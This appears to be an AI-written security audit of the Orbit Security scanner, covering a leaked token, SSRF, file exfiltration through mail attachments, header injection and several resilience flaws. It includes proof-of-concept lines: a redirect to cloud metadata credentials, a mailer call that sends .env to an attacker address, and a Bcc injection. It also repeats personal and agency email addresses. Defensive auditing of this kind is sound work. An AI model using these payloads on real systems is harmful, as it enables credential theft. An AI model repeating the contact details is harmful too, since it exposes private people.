# Orbit Security — Security & Resilience Audit Report

**Date:** September 2026  
**Target:** Orbit Security Engine (`A:\projects\orbit-security`)  
**Auditor:** Security & Resilience Engineering (Subagent)  
**Classification:** Confidential / Internal Security Review  

---

## Executive Summary

A comprehensive security, resilience, and architectural audit was performed on the Orbit Security attack surface monitoring engine. The audit evaluated core components across passive DNS scanning routines, ReportLab PDF generation, SMTP mailing pipelines, environment variable management, and operational hygiene.

Orbit Security possesses strong foundational architectural design, including clean separation of concerns, datacenter-grade SaaS takeover fingerprints, and professional co-branded reporting. However, critical vulnerabilities were identified that pose severe operational and security risks, including an **active GitHub OAuth Token exposed in plaintext in `.git/config`**, **live production credentials (Google App Password & Stripe Restricted Keys) stored on disk in `.env`**, **Server-Side Request Forgery (SSRF) vulnerabilities in exposure probing**, **ReportLab XML entity injection leading to document generation crashes**, and **SMTP CRLF / header injection risks**.

### Severity Summary
- **Critical:** 5
- **High:** 5
- **Medium:** 5
- **Low:** 3
- **Total Findings:** 18

---

## Findings

### Critical Severity

#### [CRITICAL] 1. Plaintext GitHub Personal Access Token Exposed in `.git/config`
- **Location:** `.git/config:12`
- **Description:** Line 12 of `.git/config` defines the tracking remote as:
  ```ini
  remote = https://x-access-token:gho_REDACTED_OAUTH_TOKEN@github.com/CmfH009/Orbit-Security.git
  ```
  An active GitHub Personal Access / OAuth Token (`gho_...`) is embedded directly in plaintext inside the repository configuration.
- **Impact:** Any user, process, script, or CI runner with read access to the project directory—or any web exposure of `.git` (which `scanner.py` ironically tests for in target domains)—completely compromises the GitHub account and repository. An attacker can push malicious code, delete repositories, or access private assets.
- **Proof of Concept:**
  An adversary reading `.git/config` can authenticate against the GitHub API:
  ```bash
  curl -H "Authorization: token gho_REDACTED_OAUTH_TOKEN" https://api.github.com/user
  ```
- **Recommendation:**
  1. Immediately **revoke** the token `gho_REDACTED_OAUTH_TOKEN` in GitHub Settings > Developer Settings > Personal Access Tokens.
  2. Revert `.git/config` remote URL to standard HTTPS or SSH:
     ```ini
     [branch "main"]
         remote = origin
         merge = refs/heads/main
     ```
  3. Use Windows Credential Manager (`git-credential-manager`) or `gh auth login` for authentication rather than hardcoding tokens in URLs.

---

#### [CRITICAL] 2. Server-Side Request Forgery (SSRF) & Unrestricted Redirects with Disabled TLS Verification
- **Location:** [`src/orbit_security/scanner.py`](file:///A:/projects/orbit-security/src/orbit_security/scanner.py#L28), [`#L154`](file:///A:/projects/orbit-security/src/orbit_security/scanner.py#L154), [`#L236`](file:///A:/projects/orbit-security/src/orbit_security/scanner.py#L236), [`#L273`](file:///A:/projects/orbit-security/src/orbit_security/scanner.py#L273)
- **Description:** HTTP clients are instantiated throughout `OrbitSecurityScanner` with TLS certificate validation disabled (`verify=False`) and automatic redirect following enabled (`follow_redirects=True`):
  ```python
  client = httpx.AsyncClient(timeout=self.timeout, follow_redirects=True, verify=False)
  ```
  Target URLs are constructed directly from input domains:
  ```python
  base_url = f"https://{domain}"
  url = f"{clean_base}{path}"
  resp = await client.get(url)
  ```
  There is no IP address resolution check or validation against RFC 1918 private subnets, loopback addresses (`127.0.0.1`, `localhost`), or cloud metadata endpoints (`169.254.169.254`).
- **Impact:**
  - An attacker supplying an internal IP address or domain resolving to `127.0.0.1` or `169.254.169.254` causes the scanner to query internal infrastructure and local services.
  - Because `follow_redirects=True` and `verify=False` are enabled, an external target domain can respond with an HTTP 302 redirecting the scanner to `http://169.254.169.254/latest/meta-data/identity-credentials/` or internal Kubernetes/Docker management ports, exfiltrating cloud instance credentials.
- **Proof of Concept:**
  An attacker configures DNS for `scan.attacker.com` pointing to a server returning:
  ```http
  HTTP/1.1 302 Found
  Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
  ```
  Running `scanner.audit_exposures("https://scan.attacker.com")` follows the redirect to AWS IMDS and inspects the response body for `AWS_SECRET_ACCESS_KEY`, capturing IAM role tokens.
- **Recommendation:**
  - Resolve the target domain to an IP address before connecting, and assert that the destination IP does not belong to reserved, loopback, or private ranges (`ipaddress.ip_address(ip).is_global`).
  - Set `verify=True` to enforce TLS certificate authenticity.
  - Set `follow_redirects=False` or implement a custom redirect transport that inspects and re-validates the destination IP of every redirect hop.

```python
import ipaddress
import socket

def is_safe_ip(ip_str: str) -> bool:
    try:
        ip = ipaddress.ip_address(ip_str)
        return ip.is_global and not ip.is_private and not ip.is_loopback and not ip.is_link_local
    except ValueError:
        return False
```

---

#### [CRITICAL] 3. Arbitrary Local File Exfiltration via Attachment Path
- **Location:** [`src/orbit_security/mailer.py`](file:///A:/projects/orbit-security/src/orbit_security/mailer.py#L50-L55), [`#L78-L90`](file:///A:/projects/orbit-security/src/orbit_security/mailer.py#L78-L90)
- **Description:** `EmailDispatcher.build_message` and `send_email` take an unvalidated `pdf_attachment_path`:
  ```python
  if pdf_attachment_path and os.path.exists(pdf_attachment_path):
      with open(pdf_attachment_path, "rb") as f:
          part = MIMEApplication(f.read(), Name=os.path.basename(pdf_attachment_path))
      part["Content-Disposition"] = f'attachment; filename="{os.path.basename(pdf_attachment_path)}"'
      msg.attach(part)
  ```
  The code performs no check that the path has a `.pdf` extension or that it resides inside an approved output directory.
- **Impact:** If `pdf_attachment_path` is influenced by user input, API parameters, or automated scripts, an attacker can specify `.env`, configuration files, or sensitive system files (`/etc/passwd`, `C:\Windows\win.ini`), which are packaged and emailed to the designated recipient.
- **Proof of Concept:**
  Invoking:
  ```python
  dispatcher.send_email(
      recipient_email="exfil@attacker.com",
      subject="System Health",
      body_text="Report attached",
      pdf_attachment_path=".env"
  )
  ```
  dispatches the live production `.env` file containing Stripe and Gmail credentials as an attachment.
- **Recommendation:**
  Constrain attachments to a designated safe output directory, enforce extension checks, and resolve symbolic links:
  ```python
  def is_safe_attachment_path(filepath: str, allowed_dir: str) -> bool:
      resolved = os.path.realpath(filepath)
      allowed = os.path.realpath(allowed_dir)
      return resolved.startswith(allowed) and resolved.lower().endswith(".pdf")
  ```

---

#### [CRITICAL] 4. Live Production Credentials and API Keys in Workspace `.env`
- **Location:** `.env:7, 17-19`, [`src/orbit_security/inbox_agent.py`](file:///A:/projects/orbit-security/src/orbit_security/inbox_agent.py#L111)
- **Description:** Live operational credentials and API tokens are saved in `.env` within the local working tree:
  - `SMTP_PASSWORD=REDACTED_APP_PASSWORD` (Active 16-character Google App Password)
  - `STRIPE_API_KEY=rk_live_REDACTED_KEY` (Active Stripe Restricted Secret Key)
  - `STRIPE_PUBLISHABLE_KEY=pk_live_...`
  - In `inbox_agent.py:111`, a live Stripe payment link is hardcoded as default fallback: `"https://buy.stripe.com/4gM14m1Fq2QXetya4Qcs800"`.
- **Impact:** Storing live credentials in unencrypted disk files exposes them to unauthorized tool execution, malware, and accidental commits. Hardcoded production URLs in source code prevent credential rotation and leak business information.
- **Recommendation:**
  1. Rotate the Google App Password and Stripe API keys in the respective provider management consoles immediately.
  2. Cleanse `.env` by replacing secret values with placeholders.
  3. Remove the hardcoded fallback in `inbox_agent.py` line 111 and require explicit environment configuration:
     ```python
     stripe_link = os.getenv("STRIPE_PAYMENT_LINK")
     if not stripe_link:
         raise RuntimeError("STRIPE_PAYMENT_LINK must be configured in environment.")
     ```

---

#### [CRITICAL] 5. ReportLab XML Entity Injection & Parsing Denial of Service
- **Location:** [`src/orbit_security/reporter.py`](file:///A:/projects/orbit-security/src/orbit_security/reporter.py#L151), [`#L166`](file:///A:/projects/orbit-security/src/orbit_security/reporter.py#L166), [`#L218-L226`](file:///A:/projects/orbit-security/src/orbit_security/reporter.py#L218-L226)
- **Description:** ReportLab `Paragraph` flowables parse an XML-like mini-markup language (`<b>`, `<i>`, `<font>`, etc.). Untrusted external data—such as `audit.domain`, `f.title`, `f.target`, `f.description`, `f.evidence`, and `f.remediation`—is directly interpolated into `Paragraph` strings without XML entity escaping:
  ```python
  Paragraph(f"<b>Target:</b> <font face='Courier'>{f.target}</font><br/>"
            f"<b>Details:</b> {f.description}<br/>"
            f"{f'<b>Evidence:</b> <font face=\"Courier\">{f.evidence}</font><br/>' if f.evidence else ''}"
            f"<b>Remediation:</b> {f.remediation}", body_style)
  ```
- **Impact:**
  - If a domain contains special characters or if a DNS record contains unescaped characters (e.g. `v=spf1 include:<internal>&all` or exception strings like `socket.gaierror: <Errno -2>`), ReportLab throws an unhandled XML parsing error (`xml.parsers.expat.ExpatError` or `FastSaxParseException`), crashing the entire PDF generation process.
  - An adversary controlling a scanned target can publish malicious TXT or CNAME records to intentionally crash the auditor.
  - Formatting tags like `<a href="...">` can be injected to forge links in the generated PDF.
- **Proof of Concept:**
  A scanned domain returns a TXT record `v=spf1 <unclosed_tag & test`. When `ReportGenerator.generate_pdf` builds the document, `doc.build(story)` crashes with `ExpatError: not well-formed (invalid token)`.
- **Recommendation:**
  Sanitize all dynamic strings using `xml.sax.saxutils.escape` before embedding them into `Paragraph` flowables:
  ```python
  from xml.sax.saxutils import escape

  def safe_text(val: str) -> str:
      return escape(str(val or ""))

  Paragraph(f"<b>Target:</b> <font face='Courier'>{safe_text(f.target)}</font><br/>"
            f"<b>Details:</b> {safe_text(f.description)}<br/>"
            f"{f'<b>Evidence:</b> <font face=\"Courier\">{safe_text(f.evidence)}</font><br/>' if f.evidence else ''}"
            f"<b>Remediation:</b> {safe_text(f.remediation)}", body_style)
  ```

---

### High Severity

#### [HIGH] 6. Unbounded Concurrency & Socket Exhaustion via crt.sh Subdomain Gathering
- **Location:** [`src/orbit_security/scanner.py`](file:///A:/projects/orbit-security/src/orbit_security/scanner.py#L382-L386), [`#L427-L432`](file:///A:/projects/orbit-security/src/orbit_security/scanner.py#L427-L432)
- **Description:** In `scan_domain`:
  ```python
  ct_subs = await self.fetch_subdomains_from_crtsh(domain)
  for s in ct_subs:
      subs_to_check.add(s)
  ...
  takeover_tasks = [self.check_subdomain_takeover(sub) for sub in result.subdomains_scanned]
  takeover_results = await asyncio.gather(*takeover_tasks, return_exceptions=True)
  ```
  `crt.sh` regularly returns thousands of subdomains for mature domains. `asyncio.gather(*takeover_tasks)` launches all takeover coroutines concurrently without a semaphore or rate limiting.
- **Impact:** Spawning thousands of simultaneous DNS resolution tasks and HTTP connections causes OS socket/file descriptor exhaustion (`Too many open files` / `WSAENOBUFS`), local network degradation, and severe packet drops leading to inaccurate scan results.
- **Recommendation:**
  Throttle concurrent takeover tasks using an `asyncio.Semaphore` and cap maximum subdomains:
  ```python
  sem = asyncio.Semaphore(15)
  async def bounded_takeover(sub: str):
      async with sem:
          return await self.check_subdomain_takeover(sub)

  takeover_results = await asyncio.gather(*(bounded_takeover(s) for s in list(result.subdomains_scanned)[:100]))
  ```

---

#### [HIGH] 7. SMTP CRLF / Email Header Injection & Recipient Address Manipulation
- **Location:** [`src/orbit_security/mailer.py`](file:///A:/projects/orbit-security/src/orbit_security/mailer.py#L40-L45), [`#L85-L90`](file:///A:/projects/orbit-security/src/orbit_security/mailer.py#L85-L90)
- **Description:** `build_message` accepts unvalidated `recipient_email` and `subject` strings and assigns them directly to MIME headers:
  ```python
  msg["From"] = sender_header
  msg["To"] = recipient_email
  msg["Subject"] = subject
  msg["Reply-To"] = self.smtp_user or recipient_email
  ```
  `MIMEMultipart` defaults to the legacy `compat32` policy, which does not prevent CRLF (`\r\n`) header injection when strings containing newlines are assigned.
- **Impact:** An attacker supplying inputs with newlines can inject arbitrary email headers (`Bcc:`, `Cc:`, `X-Custom:`) or inject mail body content. Because `smtplib.send_message` derives recipients from header fields, an injected `Bcc:` address will receive the email and all confidential attachments.
- **Proof of Concept:**
  Passing `recipient_email = "target@agency.com\r\nBcc: auditor-exfil@external.com"` injects an extra recipient header.
- **Recommendation:**
  Strip `\r` and `\n` characters from all header inputs, validate email syntax using RFC 5322 regex / `email.utils.parseaddr`, and adopt `email.message.EmailMessage` with `email.policy.default`:
  ```python
  import re

  def sanitize_header(val: str) -> str:
      return re.sub(r"[\r\n]+", " ", str(val)).strip()
  ```

---

#### [HIGH] 8. Committed PII and Insufficient `.gitignore` Rules for Campaign Data
- **Location:** `.gitignore:21-25`, [`data/dispatched_campaigns.json`](file:///A:/projects/orbit-security/data/dispatched_campaigns.json#L1-L32)
- **Description:** `.gitignore` explicitly excludes `data/leads_state.json` and `data/prospects.json`, but does not exclude other files in `data/`. `data/dispatched_campaigns.json` containing live agency names, contact emails (`hello@charleagency.com`, `info@commandc.com`, `hello@blubolt.com`), and timestamps was committed to Git in commit `cd0c82e8fc67e19d8e6096a8842721d587bcd58a`.
- **Impact:** Commercial outreach data and contact emails are exposed in version control history, violating data privacy standards (GDPR / CAN-SPAM) and exposing proprietary business operations.
- **Recommendation:**
  1. Add wildcard rule `data/*.json` and `data/*.csv` to `.gitignore`.
  2. Untrack and purge `data/dispatched_campaigns.json` from git history:
     ```bash
     git rm --cached data/dispatched_campaigns.json
     ```

---

#### [HIGH] 9. False-Positive Vulnerability Reporting on DNS Network Drops and Timeouts
- **Location:** [`src/orbit_security/scanner.py`](file:///A:/projects/orbit-security/src/orbit_security/scanner.py#L83-L92), [`#L125-L134`](file:///A:/projects/orbit-security/src/orbit_security/scanner.py#L125-L134)
- **Description:** In `audit_dmarc` and `audit_spf`, a broad `except Exception as e:` block generates a `HIGH` severity finding ("Missing DMARC Email Protection" / "Missing SPF Record") whenever an exception occurs:
  ```python
  except Exception as e:
      return Finding(
          title="Missing DMARC Email Protection",
          severity=Severity.HIGH,
          ...,
          evidence=str(e)
      )
  ```
- **Impact:** Network timeouts (`dns.resolver.Timeout`), upstream DNS outages (`dns.resolver.NoNameservers`), and socket errors (`socket.gaierror`) are falsely classified as missing security policies. Clients receive inaccurate security penalty grades, degrading trust.
- **Recommendation:**
  Catch specific DNS exceptions: treat `dns.resolver.NXDOMAIN` and `dns.resolver.NoAnswer` as missing records; log a scan error or return an `INFO` warning on timeouts and connection failures.

---

#### [HIGH] 10. Missing SMTP Socket Timeout and SMTPS Incompatibility
- **Location:** [`src/orbit_security/mailer.py`](file:///A:/projects/orbit-security/src/orbit_security/mailer.py#L87-L90)
- **Description:**
  ```python
  with smtplib.SMTP(self.smtp_host, self.smtp_port) as server:
      server.starttls()
      server.login(self.smtp_user, self.smtp_password)
      server.send_message(msg)
  ```
  `smtplib.SMTP` is initialized without a timeout parameter. Furthermore, if `SMTP_PORT` is set to `465` (standard SMTPS), using `smtplib.SMTP` hangs or fails because port 465 requires SSL from socket inception (`smtplib.SMTP_SSL`).
- **Impact:** Network drops or stalled SMTP servers can block execution indefinitely. Users configuring port 465 experience hard failures.
- **Recommendation:**
  Set an explicit timeout (e.g. `timeout=15.0`) and dynamically select `smtplib.SMTP_SSL` when `self.smtp_port == 465`:
  ```python
  import ssl

  context = ssl.create_default_context()
  if self.smtp_port == 465:
      server_cls = smtplib.SMTP_SSL
      server = server_cls(self.smtp_host, self.smtp_port, timeout=15.0, context=context)
  else:
      server = smtplib.SMTP(self.smtp_host, self.smtp_port, timeout=15.0)
      server.starttls(context=context)
  ```

---

### Medium Severity

#### [MEDIUM] 11. Event Loop Starvation via Synchronous Socket I/O in Async Scanner
- **Location:** [`src/orbit_security/scanner.py`](file:///A:/projects/orbit-security/src/orbit_security/scanner.py#L326-L368), [`#L422`](file:///A:/projects/orbit-security/src/orbit_security/scanner.py#L422)
- **Description:** `audit_ssl` performs synchronous socket connections (`socket.create_connection`) and blocking TLS handshakes (`context.wrap_socket`), but is called directly from `async def scan_domain`:
  ```python
  ssl_finding = self.audit_ssl(domain)
  ```
- **Impact:** Synchronous blocking socket calls freeze the asyncio event loop during network latency or TCP drops, delaying all concurrent scanning tasks.
- **Recommendation:**
  Offload `audit_ssl` to a thread pool using `asyncio.to_thread`:
  ```python
  ssl_finding = await asyncio.to_thread(self.audit_ssl, domain)
  ```

---

#### [MEDIUM] 12. ReportLab `LayoutError` Crash via Unbounded `KeepTogether` Table Flowables
- **Location:** [`src/orbit_security/reporter.py`](file:///A:/projects/orbit-security/src/orbit_security/reporter.py#L238)
- **Description:** Every finding table is wrapped in `KeepTogether([t_finding, Spacer(1, 8)])`.
- **Impact:** If `f.description` or `f.evidence` contains extensive text (such as long CNAME chains or verbose DNS records), the table height exceeds the printable page area. ReportLab throws `reportlab.platypus.doctemplate.LayoutError: Flowable ... too large on page`, failing the PDF build.
- **Recommendation:**
  Truncate `evidence` strings to a maximum length (e.g. 500 characters) and remove `KeepTogether` from multi-row tables or enable flowable splitting.

---

#### [MEDIUM] 13. Missing FQDN / RFC 1035 / RFC 1123 Input Sanitization on Scanned Domain
- **Location:** [`src/orbit_security/scanner.py`](file:///A:/projects/orbit-security/src/orbit_security/scanner.py#L19-L25), [`#L370-L375`](file:///A:/projects/orbit-security/src/orbit_security/scanner.py#L370-L375)
- **Description:** `scan_domain` accepts arbitrary strings as `domain`. No validation verifies that the input complies with RFC 1035/1123 domain specifications.
- **Impact:** Inputs containing schemes (`https://domain.com/path`), query parameters (`domain.com?id=1`), or special characters corrupt DNS queries and URL formatting.
- **Recommendation:**
  Validate the domain before processing:
  ```python
  import re

  DOMAIN_REGEX = re.compile(r"^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,63}$")
  if not DOMAIN_REGEX.match(domain):
      raise ValueError(f"Invalid domain format: {domain}")
  ```

---

#### [MEDIUM] 14. Soft-404 False Positives and Unbounded Response Buffering in Exposure Probing
- **Location:** [`src/orbit_security/scanner.py`](file:///A:/projects/orbit-security/src/orbit_security/scanner.py#L240-L258)
- **Description:** `audit_exposures` treats any HTTP 200 containing a needle as an exposure, and reads entire responses into memory via `resp.text`.
- **Impact:** Single Page Applications (Next.js, React) returning HTTP 200 `index.html` for non-existent paths trigger false positive `CRITICAL` findings if the HTML contains words like `version:`, `services:`, or `table_prefix`. Large files served on these paths cause excessive memory consumption.
- **Recommendation:**
  - Verify that `Content-Type` is not `text/html` when probing for `.env` or `docker-compose.yml`.
  - Limit response buffering to the first 64 KB using streaming.
  - Implement a negative baseline check on a random non-existent path (e.g. `/.orbit_canary_404_check`) to detect catch-all 200 routing.

---

#### [MEDIUM] 15. RFC 7208 & RFC 7489 Compliance Deficiencies in Multi-Record DNS Parsing
- **Location:** [`src/orbit_security/scanner.py`](file:///A:/projects/orbit-security/src/orbit_security/scanner.py#L59-L60), [`#L101`](file:///A:/projects/orbit-security/src/orbit_security/scanner.py#L101)
- **Description:** `scanner.py` uses `next(...)` to select the first record starting with `v=spf1` or `v=DMARC1`.
- **Impact:** Under RFC 7208 §3.2 and RFC 7489 §6.6.3, publishing multiple SPF or DMARC records is an explicit syntax error (`PermError`) that invalidates authentication. Orbit Security currently ignores duplicate records, failing to flag this critical deliverability defect.
- **Recommendation:**
  Count all matching records; if more than one record is detected, emit a `HIGH` severity finding for multiple conflicting SPF/DMARC records.

---

### Low Severity

#### [LOW] 16. Missing Outbound SMTP Rate Limiter and Burst Throttling
- **Location:** [`src/orbit_security/mailer.py`](file:///A:/projects/orbit-security/src/orbit_security/mailer.py#L73-L92)
- **Description:** `send_email` sends immediately without a rate limiter or queueing mechanism.
- **Impact:** Rapid bursts of outbound emails trigger spam filters or temporary account locks from SMTP providers.
- **Recommendation:**
  Implement a token-bucket rate limiter or enforce a configurable delay (e.g., minimum 4.0s between sends) in `EmailDispatcher`.

---

#### [LOW] 17. Arbitrary File Overwrite & Path Traversal in Report Output Paths
- **Location:** [`src/orbit_security/reporter.py`](file:///A:/projects/orbit-security/src/orbit_security/reporter.py#L76-L85), [`src/orbit_security/cli.py`](file:///A:/projects/orbit-security/src/orbit_security/cli.py#L80-L87)
- **Description:** `output_pdf` and `output_md` parameters are written directly to disk without path confinement checks.
- **Impact:** External scripts or malicious CLI arguments could overwrite arbitrary system files.
- **Recommendation:**
  Sanitize destination paths using `os.path.realpath` and enforce authorized output directories.

---

#### [LOW] 18. Hardcoded Production Fallbacks & PII in Application Code
- **Location:** [`src/orbit_security/inbox_agent.py`](file:///A:/projects/orbit-security/src/orbit_security/inbox_agent.py#L29), [`#L111`](file:///A:/projects/orbit-security/src/orbit_security/inbox_agent.py#L111)
- **Description:** `InboxAgent` hardcodes fallback values including personal email (`carsonmail009@gmail.com`) and live Stripe URLs (`https://buy.stripe.com/4gM14m1Fq2QXetya4Qcs800`).
- **Impact:** PII and business tokens are embedded in source code, hindering multi-tenant configuration and key rotation.
- **Recommendation:**
  Remove hardcoded values; read all runtime identities from environment variables.

---

## Positive Observations

1. **Robust Takeover Signatures:** `signatures.py` provides clean, datacenter-grade fingerprint patterns across 16 major cloud providers (Unbounce, GitHub Pages, S3, CloudFront, Heroku, Shopify, Webflow, Zendesk, Pantheon, Netlify, Surge, Fly.io, HubSpot, Ghost, Readme.io, UserVoice).
2. **Professional PDF Design:** `reporter.py` uses modern corporate typography, clean color palettes, and structured scorecards that deliver high-value reporting.
3. **Clean CLI UX:** `cli.py` utilizes the `rich` library effectively for clear terminal summaries and tables.
4. **Idempotent Campaign Tracking:** `run_campaign.py` and `inbox_agent.py` maintain state files to avoid duplicate processing of prospects and leads.

---

## Threat Assessment (STRIDE Model)

| STRIDE Category | Threat Description | Mitigating Control | Status |
|-----------------|---------------------|--------------------|--------|
| **Spoofing** | CRLF injection in SMTP headers allowing sender spoofing; unvalidated DNS responses. | Sanitize header fields; implement DNSSEC validation on queries. | Needs Fix |
| **Tampering** | ReportLab XML injection via malicious DNS TXT/CNAME records; MITM tampering due to `verify=False`. | Use `xml.sax.saxutils.escape`; enforce `verify=True` on all HTTP connections. | Needs Fix |
| **Repudiation** | Lack of cryptographic signature verification on Stripe webhooks; missing message IDs. | Implement Stripe webhook signature validation (`stripe.Webhook.construct_event`). | Recommended |
| **Information Disclosure** | Plaintext GitHub PAT in `.git/config`; live credentials in `.env`; arbitrary file exfiltration via mailer attachment; SSRF to cloud metadata. | Revoke PAT; rotate secrets; confine attachments to PDF output dir; block private IPs. | Urgent |
| **Denial of Service** | Unbounded coroutine gathering from `crt.sh`; blocking socket I/O in async loop; ReportLab `LayoutError`. | Implement `asyncio.Semaphore(15)`; run SSL checks in threads; truncate report evidence. | Needs Fix |
| **Elevation of Privilege** | SSRF reaching cloud instance metadata (`169.254.169.254`) extracting IAM role keys. | Validate destination IP addresses against RFC 1918/link-local ranges; disable redirects to internal IPs. | Urgent |

---

## Prioritized Hardening Roadmap

### Phase 1: Immediate Remediation (Day 0 — Blockers)
1. **Revoke GitHub Token:** Invalidate `gho_REDACTED_OAUTH_TOKEN` immediately in GitHub Developer Settings and update `.git/config`.
2. **Rotate Secrets:** Rotate Google App Password (`REDACTED_APP_PASSWORD`) and Stripe Restricted API Key (`rk_live_...`). Cleanse `.env`.
3. **Purge Git History:** Untrack and purge `data/dispatched_campaigns.json` and add `data/*.json` to `.gitignore`.
4. **Fix ReportLab XML Injection:** Wrap all dynamic strings in `reporter.py` with `xml.sax.saxutils.escape`.
5. **Mitigate SSRF:** Remove `verify=False`, disable automatic redirects (`follow_redirects=False`), and validate that target IPs are public global addresses.

### Phase 2: Resilience & Compliance (Sprint 1)
6. **Concurrency Throttling:** Introduce an `asyncio.Semaphore(15)` to bound concurrent checks in `scanner.py`.
7. **Fix SMTP CRLF & Attachments:** Sanitize header inputs in `mailer.py`, enforce `.pdf` extension and directory confinement on attachments, and add explicit socket timeouts.
8. **Asynchronous SSL Probing:** Wrap `audit_ssl` with `asyncio.to_thread` to prevent event loop blocking.
9. **Differentiate DNS Failures:** Distinguish between `NXDOMAIN`/`NoAnswer` versus `Timeout`/network errors in SPF/DMARC audits.

### Phase 3: Defensive Hardening & Hygiene (Sprint 2)
10. **RFC 7208 & 7489 Compliance:** Detect and flag duplicate SPF and DMARC records.
11. **Soft-404 Detection:** Add canary negative checks and `Content-Type` verification to prevent SPA false positives in exposure audits.
12. **Remove Hardcoded PII:** Cleanse `inbox_agent.py` fallbacks and enforce environment variable injection.
